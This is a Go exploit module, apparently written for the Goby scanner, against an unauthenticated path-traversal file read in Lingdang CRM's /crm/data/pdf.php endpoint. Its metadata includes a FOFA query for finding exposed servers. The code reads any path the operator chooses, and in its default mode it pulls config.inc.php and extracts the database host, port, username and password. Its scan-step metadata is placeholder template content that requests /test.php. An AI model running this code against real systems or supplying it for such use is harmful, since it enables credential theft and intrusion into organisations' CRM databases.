package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Spiritual-CRM-SE /pdf.php File Read Vulnerability",
    "Description": "<p>Lingdang CRM is an intelligent customer relationship management tool designed for small and medium-sized enterprises, developed and operated by Shanghai Lingdang Information Technology Co., Ltd. It is widely used in finance, education, medical care, IT services, real estate and other industries to help enterprises realize the personalized management needs of customers and enhance their competitiveness. Whether it is new customer development, old customer maintenance, sales process management, service management, etc., Lingdang CRM can provide comprehensive and efficient solutions. </p><p>There is an arbitrary file reading vulnerability in the data/pdf.php interface of Lingdang CRM, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Product": "Spiritual-CRM-SE",
    "Homepage": "http://dondee.cn/products/270.html",
    "DisclosureDate": "2024-10-13",
    "PostTime": "2024-10-16",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"crmcommon/js/jquery/jquery-1.10.1.min.js\" || (body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\")",
    "GobyQuery": "body=\"crmcommon/js/jquery/jquery-1.10.1.min.js\" || (body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\")",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the data/pdf.php interface of Lingdang CRM, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142899387"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "config.inc.php,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../config.inc.php",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "灵当CRM /pdf.php 文件读取漏洞",
            "Product": "灵当CRM标准版",
            "Description": "<p>灵当CRM是一款专为中小企业打造的智能客户关系管理工具，由上海灵当信息科技有限公司开发并运营。广泛应用于金融、教育、医疗、IT服务、房地产等多个行业领域，帮助企业实现客户个性化管理需求，提升企业竞争力。无论是新客户开拓、老客户维护，还是销售过程管理、服务管理等方面，灵当CRM都能提供全面、高效的解决方案。<br></p><p>灵当CRM data/pdf.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>灵当CRM data/pdf.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Spiritual-CRM-SE /pdf.php File Read Vulnerability",
            "Product": "Spiritual-CRM-SE",
            "Description": "<p>Lingdang CRM is an intelligent customer relationship management tool designed for small and medium-sized enterprises, developed and operated by Shanghai Lingdang Information Technology Co., Ltd. It is widely used in finance, education, medical care, IT services, real estate and other industries to help enterprises realize the personalized management needs of customers and enhance their competitiveness. Whether it is new customer development, old customer maintenance, sales process management, service management, etc., Lingdang CRM can provide comprehensive and efficient solutions.&nbsp;</p><p>There is an arbitrary file reading vulnerability in the data/pdf.php interface of Lingdang CRM, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the data/pdf.php interface of Lingdang CRM, through which an unauthenticated attacker can read important files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	postOrGet_casklcmujhahsbclyhasifhjsdjfijlsjdhfokdhbmdiklfhgbnvdj := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig("/crm/data/pdf.php?url=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/crm/data/pdf.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../config.inc.php": "database configuration",
			}
			// 函数继承
			uploadFileFunc := postOrGet_casklcmujhahsbclyhasifhjsdjfijlsjdhfokdhbmdiklfhgbnvdj

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"config.inc.php": {"../config.inc.php", "database configuration"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_casklcmujhahsbclyhasifhjsdjfijlsjdhfokdhbmdiklfhgbnvdj

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			if mode == "config.inc.php" {
				// 定义正则表达式模式
				pattern := `\$dbconfig\['db_server'\] = '((.|\n)*?)';`
				// 编译正则表达式
				re := regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match := re.FindStringSubmatch(resp)

				expResult.Output = "Key messages:\r\ndb_server = " + match[1] +"\r\n"

				// 定义正则表达式模式
				pattern = `\$dbconfig\['db_port'\] = '((.|\n)*?)';`
				// 编译正则表达式
				re = regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match = re.FindStringSubmatch(resp)

				expResult.Output += "db_port = " + match[1] +"\r\n"

				// 定义正则表达式模式
				pattern = `\$dbconfig\['db_username'\] = '((.|\n)*?)';`
				// 编译正则表达式
				re = regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match = re.FindStringSubmatch(resp)

				expResult.Output += "db_username = " + match[1] +"\r\n"

				// 定义正则表达式模式
				pattern = `\$dbconfig\['db_password'\] = '((.|\n)*?)';`
				// 编译正则表达式
				re = regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match = re.FindStringSubmatch(resp)

				expResult.Output += "db_password = " + match[1] +"\r\n"

    
        expResult.Output += "\r\nFull file contents:\r\n"+resp
        expResult.Success = true
        return expResult
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
